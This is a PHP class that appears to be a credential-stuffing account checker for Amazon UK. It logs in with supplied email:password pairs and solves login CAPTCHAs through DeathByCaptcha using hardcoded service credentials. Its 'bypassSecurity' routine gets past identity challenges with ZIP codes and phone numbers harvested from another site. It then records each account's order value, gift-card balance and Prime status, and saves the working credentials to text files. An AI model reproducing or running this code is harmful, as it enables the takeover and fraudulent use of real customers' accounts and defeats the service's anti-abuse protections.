<?php
/**
 * Created by PhpStorm.
 * User: aurelienschiltz
 * Date: 23/03/2016
 * Time: 01:45
 */



class AmazonUK
{
    private $ch;
    private $mail = "";
    private $pass = "";
    private $URLConnect = 'https://www.amazon.co.uk/ap/signin?_encoding=UTF8&openid.assoc_handle=gbflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.uk%2F%3Fie%3DUTF8%26openid.pape.max_auth_age%3D0%26openid.return_to%3Dhttps%253A%252F%252Fwww.amazon.co.uk%252F%253Fref_%253Dnav_signin%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.assoc_handle%3Dusflex%26_encoding%3DUTF8%26openid.mode%3Dcheckid_setup%26openid.ns.pape%3Dhttp%253A%252F%252Fspecs.openid.net%252Fextensions%252Fpape%252F1.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26ref_%3Dnav_custrec_signin';
    private $URLAddress16 = "http://www.amazon.co.uk/gp/your-account/order-history?opt=ab&digitalOrders=1&unifiedOrders=1&returnTo=&orderFilter=year-2016";
    private $URLAddress15 = "http://www.amazon.co.uk/gp/your-account/order-history?opt=ab&digitalOrders=1&unifiedOrders=1&returnTo=&orderFilter=year-2015";
    private $URLBalance = "https://www.amazon.co.uk/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc";
    private $URLPrime = "https://www.amazon.co.uk/gp/primecentral?ie=UTF8&ref_=ya_manage_prime&";
    private $totalPrice = 0;
    private $totalOrders = 0;
    private $balance = 0;
    private $prime = false;
    private $zipcodes = [];
    private $phones = [];
    private $totalAccounts = 0;

    function __construct($mail, $pass)
    {
        $this->mail = $mail;
        $this->pass = trim($pass);
        $already = AlreadyExist::getInstance()->findAccUk($this->mail);
        if ($already == true)
            throw new Exception();
        if (file_exists("amazoncookie.txt"))
            unlink('amazoncookie.txt');
        $this->totalAccounts = intval(file_get_contents("./txt/number"));
        $this->ch  = curl_init();
        curl_setopt($this->ch, CURLOPT_URL, $this->URLConnect);
        curl_setopt($this->ch, CURLOPT_COOKIEJAR, 'amazoncookie.txt');
       // curl_setopt($this->ch, CURLOPT_PROXY, Proxy::getInstance()->getProxy());
        curl_setopt($this->ch, CURLOPT_COOKIEFILE, 'amazoncookie.txt');
        //curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($this->ch, CURLOPT_USERAGENT, random_user_agent());
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_HEADER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);

    }

    function login($page, $captcha = false)
    {
        // try to find the actual login form
        if (!preg_match('/<form name="signIn".*?<\/form>/is', $page, $form)) {
            die('Failed to find log in form!');
        }

        $form = $form[0];

        // find the action of the login form
        if (!preg_match('/action=(?:\'|")?([^\s\'">]+)/i', $form, $action)) {
            die('Failed to find login form url');
        }


        $URL2 = $action[1]; // this is our new post url

        // find all hidden fields which we need to send with our login, this includes security tokens
        $count = preg_match_all('/<input type="hidden"\s*name="([^"]*)"\s*value="([^"]*)"/i', $form, $hiddenFields);

        $postFields = array();

        // turn the hidden fields into an array
        for ($i = 0; $i < $count; ++$i) {
            $postFields[$hiddenFields[1][$i]] = $hiddenFields[2][$i];
        }

        // add our login values
        $postFields['email'] = $this->mail;
        $postFields['password'] = $this->pass;
        if ($captcha != false)
            $postFields['guess'] = $captcha;

        $post = '';

        // convert to string, this won't work as an array, form will not accept multipart/form-data, only application/x-www-form-urlencoded
        foreach($postFields as $key => $value) {
            $post .= $key . '=' . urlencode($value) . '&';
        }

        $post = substr($post, 0, -1);

        // set additional curl options using our previous options
        curl_setopt($this->ch, CURLOPT_URL, $URL2);
        curl_setopt($this->ch, CURLOPT_REFERER, $this->URLConnect);
        curl_setopt($this->ch, CURLOPT_POST, 1);
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $post);
        $page = curl_exec($this->ch);
        if ($page == false)
            $page = curl_exec($this->ch);
        return $page;
    }

    function connect()
    {
        $page = curl_exec($this->ch);
           // curl_setopt($this->ch, CURLOPT_PROXY, Proxy::getInstance()->getNextProxy());
        $page = $this->login($page);
        $html = str_get_html($page);
        if (preg_match("/Email address already in use/", $page))
            return false;
        if ($html == false)
            return false;
        if ($page == false)
            return false;
        $isWarning = $html->find("#auth-warning-message-box");
        $isError = $html->find("#auth-error-message-box");
        if (!empty($isError) && !preg_match("/Enter the characters/", $page))
            return false;
        if (!empty($isWarning) || preg_match("/Enter the characters/", $page))
        {
            if ($isWarning != null)
                $error = $isWarning[0]->plaintext;
            if (preg_match("/Enter the characters/", $page) || preg_match("/re-enter/", $page)) {
                $client = new DeathByCaptcha_SocketClient("kangoo13", "kangoo1313");
                $image = $html->find("img#auth-captcha-image");
                if (!isset($image[0])) {
                    if (preg_match("/incorrect/", $page))
                        return false;
                }
                $image = $image[0]->src;
                if ($captcha = $client->decode(str_replace("&amp;","&", $image))) {
                    $page = $this->login($page, $captcha['text']);
                    if ($page == null || $page == false)
                        return false;
                    $html = str_get_html($page);
                    if ($html == null || $html == false)
                        return false;
                    //Proxy::getInstance()->needToChange = true;
                    $isError = $html->find("#auth-error-message-box");
                    if (!empty($isError))
                        return false;
                    $isWarning = $html->find("#auth-warning-message-box");
                    if (!empty($isWarning))
                        return $this->bypassSecurity($page);
                    // Report the CAPTCHA if solved incorrectly.
                    // Make sure the CAPTCHA was in fact incorrectly solved!
                    //if ( ... ) {
                    //  $client->report($captcha['captcha']);
                    //}
                }
            }
            else
                return $this->bypassSecurity($page);
        }
        $page = null;
        $html = null;
        return true;
    }


    function bypassSecurity($page, $nbTime = 0)
    {
        if ($nbTime == 3)
            return false;
        if ($nbTime == 0)
        {
            $habit = new MyHabit($this->mail, $this->pass);
            if ($habit->connect() == false) {
                echo 'Error connect ';
                return false;
            }
            $habit->getSecurityAnswersUK();
            $this->zipcodes = $habit->getZipCodes();
            $this->phones = $habit->getPhones();
        }

        // try to find the actual login form
        if (!preg_match('/<form id="ap_dcq_form" name="ap_dcq_form".*?<\/form>/is', $page, $form)) {
            echo 'ap_dcq_form';return false;
        }

        $form = $form[0];

        // find the action of the login form
        if (!preg_match('/action=(?:\'|")?([^\s\'">]+)/i', $form, $action)) {
            die('Failed to find login form url');
        }

        $URL2 = $action[1]; // this is our new post url

        // find all hidden fields which we need to send with our login, this includes security tokens
        $count = preg_match_all('/<input type="hidden"\s*name="([^"]*)"\s*value="([^"]*)"/i', $form, $hiddenFields);

        $postFields = array();

        // turn the hidden fields into an array
        for ($i = 0; $i < $count; ++$i) {
            $postFields[$hiddenFields[1][$i]] = $hiddenFields[2][$i];
        }
        $html = str_get_html($page);
        // add our login values
        if (isset($this->zipcodes[$nbTime]))
            $postFields['dcq_question_subjective_1'] = $this->zipcodes[$nbTime];
        else if (isset($this->phones[$nbTime]))
            $postFields['dcq_question_subjective_2'] = $this->phones[$nbTime];
        if (!$html->find("span#challenge_0")) {
            if (preg_match("/ZIP code/", $page)) {
                if (!isset($this->zipcodes[$nbTime]))
                    return false;
                $postFields['dcq_question_subjective_1'] = $this->zipcodes[$nbTime];
            }
            else {
                if (!isset($this->phones[$nbTime]))
                    return false;
                $postFields['dcq_question_subjective_1'] = $this->phones[$nbTime];
            }
        }
        $post = '';

        // convert to string, this won't work as an array, form will not accept multipart/form-data, only application/x-www-form-urlencoded
        foreach($postFields as $key => $value) {
            $post .= $key . '=' . urlencode($value) . '&';
        }

        $post = substr($post, 0, -1);
        $URL2 = 'http://www.amazon.co.uk'.$URL2;
        // set additional curl options using our previous options
        curl_setopt($this->ch, CURLOPT_URL, $URL2);
        curl_setopt($this->ch, CURLOPT_REFERER, $this->URLConnect);
        curl_setopt($this->ch, CURLOPT_POST, 1);
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $post);

        $page = curl_exec($this->ch); // make request
        if ($page == false)
            $page = curl_exec($this->ch);
        if (preg_match("/We blocked/", $page))
            return false;
        $html = str_get_html($page);
        $isError = $html->find("#auth-error-message-box");
        $data = true;
        if (!empty($isError))
            $data = $this->bypassSecurity($page, $nbTime + 1);
        return $data;
    }

    function parseOrders()
    {
        curl_setopt($this->ch, CURLOPT_URL, $this->URLAddress15);
        $page = curl_exec($this->ch);
        if ($page == false)
        {
            echo $this->mail."problem parse orders";
            return false;
        }
        $html = str_get_html($page);
        if ($html == null)
            return false;
        $orders = $html->find("#ordersContainer");
        if ($orders == null)
            return false;
        foreach ($orders[0]->find('div.order') as $solo) {
            $divprice = $solo->find("div.a-span2");
            $price = $divprice[0]->find("div.a-size-base");
            $finalPrice = $price[0]->plaintext;
            // To remove the $ and make the intval work.
            $finalPrice = str_replace('£', '', $finalPrice);
            $this->totalPrice += intval($finalPrice);
            $this->totalOrders += 1;
        }
        curl_setopt($this->ch, CURLOPT_URL, $this->URLAddress16);
        $page = curl_exec($this->ch);
        if ($page == false)
            $page = curl_exec($this->ch);
        $html = str_get_html($page);
        if ($html == null)
            return false;
        $orders = $html->find("#ordersContainer");
        foreach ($orders[0]->find('div.order') as $solo) {
            $divprice = $solo->find("div.a-span2");
            $price = $divprice[0]->find("div.a-size-base");
            $finalPrice = $price[0]->plaintext;
            // To remove the $ and make the intval work.
            $finalPrice = str_replace('£', '', $finalPrice);
            $this->totalPrice += intval($finalPrice);
            $this->totalOrders += 1;
        }
        return true;
    }


    function parseBalance()
    {
        curl_setopt($this->ch, CURLOPT_URL, $this->URLBalance);
        $page = curl_exec($this->ch);
        if ($page == false)
            return false;
        $html = str_get_html($page);
        if ($html == null)
            return false;
        $td = $html->find("td.gcBalance");
        $balance = $td[0]->find("span");
        $this->balance = intval(str_replace("$", "", $balance[0]));
    }

    function parsePrime()
    {
        curl_setopt($this->ch, CURLOPT_URL, $this->URLPrime);
        $page = curl_exec($this->ch);
        if ($page == false)
            return false;
        $html = str_get_html($page);
        if ($html == false)
            return false;
        $isPrime = $html->find("div.autoRenewWarningMessage");
        if (!empty($isPrime[0]))
            return;
        else
            $this->prime = true;
    }

    function parseAccount()
    {
        curl_setopt($this->ch, CURLOPT_POST, 0);
        $ret = $this->parseOrders();
        if ($ret == false)
            return false;
        $this->parseBalance();
        $this->parsePrime();

    }

    function displayAccount()
    {
        $prime = ($this->prime == false) ? 'No' : 'Yes';
        $display = $this->mail.":".$this->pass." || ".$this->totalOrders." orders || Balance : £".$this->balance." || Prime : ".$prime." || Orders total value : £".$this->totalPrice." || UK ||";
        echo $display."<br />";
        $myFile = "./txt/savedUK";
        $fh = fopen($myFile, 'a') or die("can't open file");
        $string = $this->totalAccounts."||".$display."\n";
        fwrite($fh, $string);
        fclose($fh);
        if ($this->totalOrders > 0)
        {
            $myFile = "./txt/savedPositiveUK";
            $fh = fopen($myFile, 'a') or die("can't open file");
            $display2 =  $this->totalOrders." orders || Balance : £".$this->balance." || Prime : ".$prime." || Orders total value : £".$this->totalPrice." || UK ||";
            $string = $this->totalAccounts."||".$display2."\n";
            fwrite($fh, $string);
            fclose($fh);
        }
        $this->totalAccounts++;
        $fh = fopen("./txt/number", "w+");
        fwrite($fh, $this->totalAccounts);
        fclose($fh);
        $myFile = "./txt/allAccounts";
        $fh = fopen($myFile, 'a') or die("can't open file");
        $display2 =  $this->mail.":".$this->pass."\n";
        fwrite($fh, $display2);
        fclose($fh);
    }
}